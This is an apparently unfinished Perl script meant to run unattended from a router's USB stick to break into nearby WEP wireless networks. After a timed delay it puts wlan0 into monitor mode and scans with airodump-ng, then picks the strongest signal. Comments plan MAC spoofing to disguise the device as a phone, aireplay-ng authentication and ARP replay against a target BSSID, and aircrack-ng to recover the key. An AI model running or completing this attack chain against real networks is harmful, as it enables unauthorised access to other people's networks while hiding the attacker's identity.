#!/usr/bin/perl

# This script will be the kick off script. 
# The steps that should have taken place at this point:
# 1. The router should be powered on
# 2. Computer connected to the ethernet port
# 3. USB storage unencrypted and mounted
# 4. This script and all other extra apps should be installed to the USB stick


sub firstrun {

  if ($ARGV[0] == "" ) {
  
  print "Please give a time in minutes to when router should start scanning.\n\n";
  print "eg: \"perl kickoff.pl 25\"\n";
  #print $ARGV[0];
  exit 0;
  } else {
  # since sleep is in seconds, we need to convert it to minutes
  $sleepytime = $ARGV[0]*60;
  sleep $sleepytime;
  }

}
  
firstrun;  

# change the mac address of wlan0 to an android or iphone/ipad device


# put wlan0 into monitor mode
print `airmon-ng start wlan0`;

# now that we're in monitor mode, we need to use the device. 

# this command needs to be fixed. needs to be run a certain length of time. thinking about doing a 
# `timeout 120 airodump-ng -encrypt WEP mon0 -w wep.txt`
# this will run the command for 120 seconds; rudimentary but works.

print `airodump-ng -encrypt WEP mon0 -w wep.txt`;


# once this is in the file, we should parse the first couple lines and look for pertenent data:
# mac address, broadcast strength (as we want to crack the loudest one) and SSID
# the file we should parse should be wep.txt-01.csv

# cat wep.txt-01.csv | grep WEP | cut -d ',' -f1,9,14 > out.txt

# found out which value is largest out of the bunch... this is gonna take some perl foo.
# open file, for each line, grab 2nd value. compare

use List::Util qw( min max );

open(WEP, "<out.txt");

# for each line, put the 2nd column into @sigstrength
foreach $line (<WEP>){

  @fullline = split(',', $line);
  push(@sigstrength, $fullline[1]);

}

my $min = min @sigstrength;
my $max = max @sigstrength;

print "Min: $min\n";
print "Max: $max\n";

print @sigstrength;


# after the pertenent data is parsed, then 
# airodump-ng -c 11 --bssid (mac we want to crack) -w output mon0




#aireplay-ng -1 0 -a E0:91:F5:FD:D7:E2 mon0
#aireplay-ng -3 -b E0:91:F5:FD:D7:E2 mon0


#aircrack-ng output-01.cap 

#wait for "key found"
